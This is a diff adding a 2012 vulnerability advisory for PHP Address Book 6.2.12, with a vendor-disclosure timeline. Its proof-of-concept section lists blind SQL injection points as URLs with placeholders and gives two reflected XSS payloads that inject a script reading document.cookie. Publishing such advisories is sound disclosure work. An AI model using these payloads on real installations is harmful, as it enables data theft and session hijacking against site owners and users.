@@ -1,0 +1,44 @@
+Advisory:		PHP Address Book 6.2.12 Multiple security vulnerabilities
+Advisory ID:		SSCHADV2012-007
+Author:			Stefan Schurtz
+Affected Software:	Successfully tested on PHP Address Book 6.2.12
+Vendor URL:		http://sourceforge.net/projects/php-addressbook/
+Vendor Status:		informed
+
+==========================
+Vulnerability Description
+==========================
+
+PHP Address Book 6.2.12 is prone to multiple XSS and SQL-Injection vulnerabilities
+
+==================
+PoC-Exploit
+==================
+
+// (Blind) SQL-Injection
+http://[target]/addressbook/edit.php?id=[sql-injection]
+http://[target]/addressbook/group.php?add=Add to&group=1&selected%5b%5d=132&to_group=[sql-injection]
+http://[target]/addressbook/vcard.php?id=[sql-injection]
+
+// XSS
+http://[target]/addressbook/preferences.php?from='"</script><script>alert(document.cookie)</script>
+http://[target]/addressbook/index.php?group='"</script><script>alert(document.cookie)</script>
+
+====================
+Disclosure Timeline
+====================
+
+03-Mar-2012 - vendor informed
+
+========
+Credits
+========
+
+Vulnerabilities found and advisory written by Stefan Schurtz.
+
+===========
+References
+===========
+
+http://sourceforge.net/tracker/?group_id=157964&atid=8059299
+http://www.darksecurity.de/advisories/2012/SSCHADV2012-007.txt
